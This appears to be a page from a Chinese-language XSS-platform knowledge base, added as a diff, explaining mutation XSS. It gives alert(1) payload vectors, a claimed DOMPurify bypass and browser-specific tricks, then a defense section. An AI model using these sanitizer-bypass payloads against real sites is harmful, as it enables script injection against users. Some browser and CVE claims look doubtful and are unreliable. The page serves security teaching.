@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="mXSS突变XSS攻击原理深度剖析，包括DOM解析差异、Mutation XSS实战Payload、浏览器兼容性利用等高级技术。">
+<meta name="keywords" content="mXSS,突变XSS,Mutation XSS,DOM XSS,浏览器差异,innerHTML,DOMPurify绕过">
+<title>mXSS(突变XSS)原理与利用技术详解 - XSS安全知识库</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">mXSS突变攻击</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-dna"></i> mXSS(突变XSS)原理与利用</h1><div style="color:#999"><span>17分钟阅读</span> | <span>高级技巧</span></div></div></div>
+<div class="container"><div class="content" style="color:#ccc;line-height:1.8">
+<h2><i class="fas fa-info-circle"></i> 一、mXSS基础概念</h2>
+<p>mXSS(Mutation XSS)是指通过利用浏览器DOM解析器的差异，使原本安全的HTML代码在DOM树构建过程中发生"突变"，从而绕过XSS过滤器的攻击技术。</p>
+<h3>1.1 产生原因</h3>
+<ul><li>浏览器HTML解析器与过滤器的解析差异</li><li>innerHTML属性的特殊行为</li><li>DOM树构建过程中的节点重组</li><li>不同浏览器的兼容性差异</li></ul>
+
+<h2><i class="fas fa-code"></i> 二、mXSS攻击原理</h2>
+<h3>2.1 基础示例</h3>
+<pre><code class="language-javascript">// 安全的HTML（通过过滤器）
+var safe = '&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;';
+
+// 插入DOM后发生突变
+div.innerHTML = safe;
+console.log(div.innerHTML);
+// 输出：&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/p&gt;&lt;/noscript&gt;
+// 在某些浏览器中，img标签会被执行！</code></pre>
+
+<h3>2.2 经典mXSS向量</h3>
+<pre><code class="language-markup">&lt;!-- 向量1：noscript突变 --&gt;
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+
+&lt;!-- 向量2：form突变 --&gt;
+&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;
+
+&lt;!-- 向量3：listing/xmp标签 --&gt;
+&lt;listing&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/listing&gt;
+
+&lt;!-- 向量4：namespace突变 --&gt;
+&lt;svg&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;
+
+&lt;!-- 向量5：HTML5实体突变 --&gt;
+&lt;img src="x" onerror="alert`1`"&gt;</code></pre>
+
+<h2><i class="fas fa-tools"></i> 三、高级利用技巧</h2>
+<h3>3.1 innerHTML特性利用</h3>
+<pre><code class="language-javascript">// innerHTML会规范化HTML
+div.innerHTML = '&lt;img src="test" /&gt;';
+console.log(div.innerHTML); // &lt;img src="test"&gt;
+
+// 利用这个特性绕过过滤
+var payload = '&lt;img src=1 href=1 onerror="alert(1)"&gt;';
+div.innerHTML = payload;
+// 某些过滤器只检查原始字符串，但浏览器会重新序列化</code></pre>
+
+<h3>3.2 DOMPurify绕过（历史漏洞）</h3>
+<pre><code class="language-markup">&lt;!-- CVE-2019-20374 --&gt;
+&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;
+
+&lt;!-- SVG命名空间混淆 --&gt;
+&lt;svg&gt;&lt;![CDATA[&lt;image xlink:href="x" onerror="alert(1)" /&gt;]]&gt;&lt;/svg&gt;</code></pre>
+
+<h3>3.3 浏览器差异利用</h3>
+<pre><code class="language-javascript">// Chrome vs Firefox差异
+// Chrome允许：
+&lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;
+
+// IE特有：
+&lt;img src="x" onload="alert(1)"&gt;
+&lt;!-- IE会在失败时也触发onload --&gt;</code></pre>
+
+<h2><i class="fas fa-shield-alt"></i> 四、防御措施</h2>
+<h3>4.1 使用textContent代替innerHTML</h3>
+<pre><code class="language-javascript">// 危险
+element.innerHTML = userInput;
+
+// 安全
+element.textContent = userInput;</code></pre>
+
+<h3>4.2 使用现代化消毒库</h3>
+<pre><code class="language-javascript">// 使用最新版DOMPurify
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(dirty, {
+  SAFE_FOR_TEMPLATES: true,
+  RETURN_TRUSTED_TYPE: true
+});</code></pre>
+
+<h3>4.3 Trusted Types API</h3>
+<pre><code class="language-javascript">// 配置Trusted Types策略
+const policy = trustedTypes.createPolicy('default', {
+  createHTML: (string) => DOMPurify.sanitize(string)
+});
+
+element.innerHTML = policy.createHTML(userInput);</code></pre>
+
+<h2><i class="fas fa-book"></i> 五、真实案例</h2>
+<h3>5.1 Gmail mXSS (2012)</h3>
+<p>研究员Gareth Heyes发现Gmail过滤器可被mXSS绕过，影响数百万用户。</p>
+
+<h3>5.2 Yahoo Mail mXSS (2013)</h3>
+<p>利用noscript标签突变绕过Yahoo Mail的XSS过滤器。</p>
+
+<h2><i class="fas fa-graduation-cap"></i> 总结</h2>
+<p>mXSS是利用浏览器解析差异的高级技术，防御重点：</p>
+<ol><li>避免使用innerHTML</li><li>使用最新的消毒库</li><li>启用Trusted Types</li><li>定期更新浏览器和库</li></ol>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="blind-xss.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库</a>
+<a href="xss-platform-usage.html" style="color:#00ff41;text-decoration:none">下一篇 <i class="fas fa-arrow-right"></i></a>
+</div>
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999">© 2025 蓝莲花XSS平台</div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
